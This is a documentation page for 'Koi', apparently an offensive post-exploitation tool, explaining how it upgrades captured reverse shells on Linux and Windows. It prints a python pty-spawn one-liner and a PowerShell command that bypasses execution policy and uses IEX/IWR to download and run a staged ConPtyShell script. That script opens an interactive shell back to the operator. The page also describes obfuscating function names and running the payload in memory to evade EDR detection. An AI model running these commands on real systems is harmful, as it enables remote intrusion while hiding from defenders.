# Upgrading your sessions

Koi allows you to automatically upgrade your sessions for both Windows and Linux.

## For Linux 

As of now, linux is pretty straight forward. It spawns a pty with python **on the remote machine**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

So you can already see where the issue is. If you work with a machine without python, the pty won't spawn. Or most EDR flags /bin/bash

This feature needs upgrading and this is talked about in the [future updates](future-updates.md).

---

## For Windows

On Windows, Koi upgrades a raw reverse shell into a fully interactive PTY-like session using [ConPtyShell by antoniococo](https://github.com/antonioCoco/ConPtyShell).

The upgrade process is automatic and works as follows:

1. Koi downloads the latest `Invoke-ConPtyShell.ps1`
2. The script is cached locally for offline reuse
3. Koi obfuscates the PowerShell function name to reduce detections
4. A temporary HTTP server is spawned locally
5. The target downloads and executes the payload
6. A new interactive ConPTY session connects back

### How it works internally

Koi launches the following kind of command on the remote host:

```powershell
powershell -nop -ep bypass -c "
IEX(IWR 'http://<LOCAL_IP>:<HTTP_PORT>/c.ps1' -UseBasicParsing);
<OBFUSCATED_FUNCTION> -RemoteIp <LOCAL_IP> -RemotePort <PORT> -Rows <ROWS> -Cols <COLS> -CommandLine powershell"
```

### A bit more explainations

#### Automatic caching

If GitHub is unreachable, Koi automatically falls back to the locally cached version of ConPtyShell.

#### Automatic terminal sizing

The current terminal dimensions are detected automatically and passed to ConPtyShell so the remote PTY matches your local console.

#### Session replacement

Once the upgraded session connects back:

- The old shell is closed
- The new ConPTY session replaces it transparently
- The session ID stays identical

### Requirements

The remote target must support:

- PowerShell
- HTTP connectivity to the operator machine
- Windows 10 / Windows Server 2019+ (recommended for ConPTY support)

### Notes

Some EDRs may still detect:

- `powershell.exe`
- `Invoke-WebRequest`
- ConPTY-related behaviours

Koi currently mitigates this partially through:

- Function name obfuscation
- In-memory execution
- Temporary HTTP staging

Further stealth improvements are planned in future updates.